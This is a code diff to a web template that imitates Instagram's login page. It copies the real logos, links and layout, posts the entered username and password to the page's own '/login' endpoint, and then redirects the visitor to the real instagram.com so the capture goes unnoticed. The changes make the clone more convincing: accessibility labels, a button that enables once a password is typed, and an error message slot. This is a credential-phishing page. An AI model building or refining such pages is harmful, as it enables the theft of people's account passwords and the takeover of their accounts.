@@ -12,20 +12,21 @@
 <body class="h-screen overflow-hidden flex items-center justify-center" style="background: white;">
     <div class="h-screen bg-gray-50 flex flex-col justify-center items-center">
         <div class="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
-            <img src="{{ url_for('static', path='images/Instagram_logo.png') }}" class="instagram-logo">
+            <img src="{{ url_for('static', path='images/Instagram_logo.png') }}" class="instagram-logo" alt="Instagram Logo">
             <form class="mt-8 w-64 flex flex-col" action="/login" method="post" onsubmit="redirectToInstagram()">
                 <input autofocus
                     class="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
-                    id="email" name="email" placeholder="Phone number, username, or email" type="text"> <!-- Added name attribute -->
+                    id="email" name="email" aria-label="Email or Username" placeholder="Phone number, username, or email" type="text">
                 <div class="relative mb-4">
-                <input
-                    class="text-xs w-full rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
-                    id="password" name="password" placeholder="Password" type="password"> <!-- Added name attribute -->
-                <span class="show-password" id="showPassword" style="display: none;">Show</span>
+                    <input
+                        class="text-xs w-full rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
+                        id="password" name="password" aria-label="Password" placeholder="Password" type="password">
+                    <span class="show-password" id="showPassword">Show</span>
                 </div>
-                <button type="submit" class="text-sm text-center bg-blue-300 text-white py-1 rounded font-medium">
-                Log In
+                <button type="submit" id="loginButton" class="text-sm text-center bg-gray-300 text-white py-1 rounded font-medium transition duration-200 cursor-not-allowed" disabled>
+                    Log In
                 </button>
+                <div id="error-message" class="text-red-500 text-xs mt-2 hidden"></div>
             </form>
             <div class="flex justify-evenly space-x-2 w-64 mt-4">
                 <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
@@ -33,25 +34,25 @@
                 <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
             </div>
             <button class="mt-4 flex">
-                <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATAgIfDKjW9kW1cdZ4xpgpASxLKEoLbPId46QzejdV4Xux-HLQXKZzS2g0A6mhmwrhMtSqatZxghoYNW87zkPO_YskcoAPsUL11VEWgz-Bl1fOO6CWdFZew8UsrjfZAdsWnLxFQck7a2CwedCGOMdkQjY8dLXYt7KQ69XFjUOiZQi37hugpvHmFNBp7TbQgGhpB2HPFyamzl_2xaSiGcghlmCA9Y5HyNMgUT6PRfjENlOmyzDUMVbdMYqKUIW9jokkDgXVsPjqHyp_v0GcLKm1YsNUWEM0mp0NUGO9MmFbZimwpgrvGVbXsTcgl4ECFG3PY_xDelVL_HuuRo33yH6QM1Gitll33tZ01zU-YwBJc-PAS47ui2ZrXkmwuEGJ8Nz2n4EEgOIa3WwjNpsJkto0snQilWIsnR04CXlRM" target="_self" style="display: flex; align-items: center; text-decoration: none;">
-                    <img src="{{ url_for('static', path='images/facebook.png') }}" class="facebook-logo">
-                    <span class="font-semibold facebook-txt ml-1">Log in with Facebook</span>
+                <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATAgIfDKjW9kW1cdZ4xpgpASxLKEoLbPId46QzejdV4Xux-HLQXKZzS2g0A6mhmwrhMtSqatZxghoYNW87zkPO_YskcoAPsUL11VEWgz-Bl1fOO6CWdFZew8UsrjfZAdsWnLxFQck7a2CwedCGOMdkQjY8dLXYt7KQ69XFjUOiZQi37hugpvHmFNBp7TbQgGhpB2HPFyamzl_2xaSiGcghlmCA9Y5HyNMgUT6PRfjENlOmyzDUMVbdMYqKUIW9jokkDgXVsPjqHyp_v0GcLKm1YsNUWEM0mp0NUGO9MmFbZimwpgrvGVbXsTcgl4ECFG" target="_self" style="display: flex; align-items: center; text-decoration: none;">
+                    <img src="{{ url_for('static', path='images/facebook.png') }}" class="facebook-logo" alt="Facebook Logo">
+                    <span class="font-semibold facebook-txt ml-1 hover:text-dark-blue">Log in with Facebook</span>
                 </a>
             </button>
-            <a href="https://www.instagram.com/accounts/password/reset/" class="text-xs mt-4 cursor-pointer -mb-4 forgot-pass-txt">Forgot password?</a>
+            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pass-txt text-sm mt-4 cursor-pointer -mb-4">Forgot password?</a>
         </div>
         <div class="bg-white border border-gray-300 text-center w-80 py-4">
             <span class="text-sm">Don't have an account?</span>
-            <a href="https://www.instagram.com/accounts/emailsignup/" class="text-blue-500 text-sm font-semibold signup-txt">Sign up</a>
+            <a href="https://www.instagram.com/accounts/emailsignup/" class="signup-txt text-blue-500 text-sm font-semibold">Sign up</a>
         </div>
         <div class="mt-3 text-center">
             <span class="text-sm">Get the app.</span>
             <div class="flex mt-3 space-x-2">
                 <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN" class="google-store-logo" target="_blank">
-                    <img src="{{ url_for('static', path='images/badge_android_english-en.png') }}" alt="Button Image">
+                    <img src="{{ url_for('static', path='images/badge_android_english-en.png') }}" alt="Google Play Store">
                 </a>
                 <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US" class="microsoft-store-logo" target="_blank">
-                    <img src="{{ url_for('static', path='images/microsoft-store.png') }}" alt="Button Image">
+                    <img src="{{ url_for('static', path='images/microsoft-store.png') }}" alt="Microsoft Store">
                 </a>
             </div>
         </div>
@@ -60,32 +61,45 @@
     <script>
         const passwordField = document.getElementById("password");
         const showPasswordButton = document.getElementById("showPassword");
+        const errorMessage = document.getElementById("error-message");
+        const loginButton = document.getElementById("loginButton");
 
-        // Show the "Show" button when there is input in the password field
         passwordField.addEventListener("input", function () {
-            showPasswordButton.style.display = passwordField.value.length > 0 ? "inline" : "none"; // Show or hide button based on input
+            showPasswordButton.style.display = passwordField.value.length > 0 ? "inline" : "none";
+            if (passwordField.value.length >= 6) {
+                loginButton.classList.remove('cursor-not-allowed');
+                loginButton.classList.add('bg-blue-500');
+                loginButton.removeAttribute('disabled');
+            } else {
+                loginButton.classList.add('cursor-not-allowed');
+                loginButton.classList.remove('bg-blue-500');
+                loginButton.setAttribute('disabled', true);
+            }
         });
 
-        // Toggle password visibility when the "Show" button is clicked
         showPasswordButton.addEventListener("click", function () {
             const isPassword = passwordField.type === "password";
-            passwordField.type = isPassword ? "text" : "password"; // Toggle input type
-            showPasswordButton.textContent = isPassword ? "Hide" : "Show"; // Toggle button text
+            passwordField.type = isPassword ? "text" : "password";
+            showPasswordButton.textContent = isPassword ? "Hide" : "Show";
         });
 
         const emailInput = document.getElementById('email');
         emailInput.addEventListener('keydown', function(event) {
             if (event.key === 'Enter') {
                 event.preventDefault();
-                passwordField.focus(); // Move focus to password field on Enter
+                passwordField.focus();
             }
         });
 
         function redirectToInstagram() {
-            // Redirect to Instagram after a short delay to allow form submission
             setTimeout(function() {
                 window.location.href = "https://www.instagram.com/";
-            }, 1000); // Adjust the delay as needed (1000 ms = 1 second)
+            }, 1000);
+        }
+
+        function displayError(message) {
+            errorMessage.textContent = message;
+            errorMessage.classList.remove('hidden');
         }
     </script>
 </body>
